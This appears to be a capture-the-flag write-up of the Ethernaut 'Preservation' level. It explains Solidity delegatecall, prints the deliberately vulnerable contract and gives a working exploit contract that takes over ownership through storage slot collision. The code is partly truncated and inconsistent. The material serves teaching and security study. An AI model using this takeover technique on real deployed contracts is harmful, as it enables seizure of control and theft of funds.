# Understanding Delegate Call in Solidity Contracts

## Introduction
In Solidity smart contracts, delegate calls are a powerful feature that enables one contract to execute code from another contract while preserving the context of the calling contract. This mechanism is crucial for implementing upgradable contracts, where logic can be changed without modifying the contract's state or storage. In this article, we'll delve into how delegate calls work and explore a practical example.

## Overview
The example contract `Preservation` demonstrates the usage of delegate calls. It consists of two library contracts (`timeZone1Library` and `timeZone2Library`) and a main contract `Preservation`. The main contract's purpose is to delegate calls to these libraries for setting timestamps for different time zones.

## How Delegate Calls Work
Delegate calls execute the code of the called contract within the context of the calling contract. This means that the called contract's code is run, but the state variables, `msg.sender`, and `msg.value` are all taken from the calling contract.

### Implementation Details
- The `Preservation` contract has two public library addresses: `timeZone1Library` and `timeZone2Library`.
- The `setFirstTime` and `setSecondTime` functions in `Preservation` contract delegate calls to the respective time zone libraries.
- The `LibraryContract` holds a `storedTime` variable and provides a `setTime` function to update it.

## Exploiting Delegate Call
In this level, we exploit the delegate call mechanism to modify critical state variables in the target contract. Here's how it's done:

1. Deploy the contract and obtain its address.
2. Call `setFirstTime` function with the address of the deployed contract as an argument. This will execute the library contract's code, modifying the storage of the deployed contract.
3. Define a `setTime` function in the deployed contract. This function will manipulate the target contract's storage directly.
4. With the `setTime` function, modify critical variables like `owner`, thereby altering the behavior of the target contract.

## Conclusion
Understanding delegate calls is crucial for building robust and upgradable smart contracts in Solidity. While powerful, they also come with security implications, especially when interacting with external contracts. Developers must carefully design their contracts and thoroughly test delegate call functionalities to ensure the security and integrity of their decentralized applications.

By grasping the concepts outlined in this article, developers can leverage delegate calls effectively and build more flexible and maintainable smart contract systems.


### Preservation

    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Preservation {
    
      // Public library contracts 
      address public timeZone1Library;
      address public timeZone2Library;
      address public owner; 
      uint storedTime;
      // Function signature for delegatecall
      bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    
      constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
      }
     
      // Set the time for timezone 1
      function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
      }
    
      // Set the time for timezone 2
      function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
      }
    }
    
    // Simple library contract to set the time
    contract LibraryContract {
    
      // Stores a timestamp 
      uint storedTime;  
    
      function setTime(uint _time) public {
        storedTime = _time;
      }

# Exploit Contract Address

    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    
    import "../instances/Ilevel16.sol";
    
    contract DelegateHack {
    
        address public t1;
        address public t2;
        address public owner;
        Preservation level16 = Preservation(0x1E422B805DC5541a09fBbf239D734313B9F42Eca);      
    
        function exploit() external {
            level16.setFirstTime(uint256(address(this)));
            level16.setFirstTime(uint256(0xEAce4b71CA1A128e8B562561f46896D55B9B0246));
        }
    
        function setTime(address _owner) public {
            owner = _owner;
        }
    
    }

